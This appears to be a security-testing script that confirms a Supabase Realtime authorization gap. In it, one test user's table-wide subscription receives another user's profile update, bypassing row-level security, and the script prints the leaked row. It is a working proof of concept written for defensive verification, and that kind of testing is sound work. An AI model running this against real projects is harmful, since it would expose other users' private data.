// Manual verification for T3-Realtime-Hijack-001 — NOT part of the scanned
// app surface (Seclayer has no WebSocket client; this script exists purely
// to confirm the vulnerability is real before recording it as a confirmed,
// out-of-scope gap in vulnerabilities.json).
//
// Alice subscribes to postgres_changes on the whole `profiles` table using
// only the anon key. Bob then updates HIS OWN row (through his own
// authenticated client — a completely legitimate action on his part). If
// Alice's subscription callback fires for Bob's change, the hijack is real:
// Alice is receiving updates for data RLS would never let her SELECT
// directly.
//
// Usage: node --env-file=.env scripts/verify-realtime-hijack.mjs
import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.SUPABASE_URL;
const ANON_KEY = process.env.SUPABASE_ANON_KEY;

const alicePass = 'AlicePass!2026';
const bobPass = 'BobPass!2026';

const aliceAuth = createClient(SUPABASE_URL, ANON_KEY, { auth: { persistSession: false } });
const bobAuth = createClient(SUPABASE_URL, ANON_KEY, { auth: { persistSession: false } });

const { data: aliceSession, error: aliceErr } = await aliceAuth.auth.signInWithPassword({ email: 'alice@tier3.test', password: alicePass });
if (aliceErr) throw aliceErr;
const { data: bobSession, error: bobErr } = await bobAuth.auth.signInWithPassword({ email: 'bob@tier3.test', password: bobPass });
if (bobErr) throw bobErr;

let received = null;
const channel = aliceAuth
  .channel('public:profiles')
  .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles' }, (payload) => {
    received = payload;
  })
  .subscribe((status, err) => {
    console.log('subscribe status:', status, err ? err.message : '');
  });

await new Promise((r) => setTimeout(r, 4000)); // let the subscription establish

const updateResult = await bobAuth.from('profiles').update({ sensitive_data: `bob-updated-${Date.now()}` }).eq('user_id', bobSession.user.id).select();
console.log('bob update result:', JSON.stringify(updateResult.data), updateResult.error?.message || '');

await new Promise((r) => setTimeout(r, 3000)); // let the broadcast arrive

if (received && received.new?.user_id === bobSession.user.id) {
  console.log('HIJACK CONFIRMED: Alice (subscribed with only the anon key) received Bob\'s profile UPDATE:');
  console.log(JSON.stringify(received.new, null, 2));
} else {
  console.log('NOT confirmed — Alice did not receive Bob\'s update. Payload:', received);
}

await aliceAuth.removeChannel(channel);
process.exit(0);
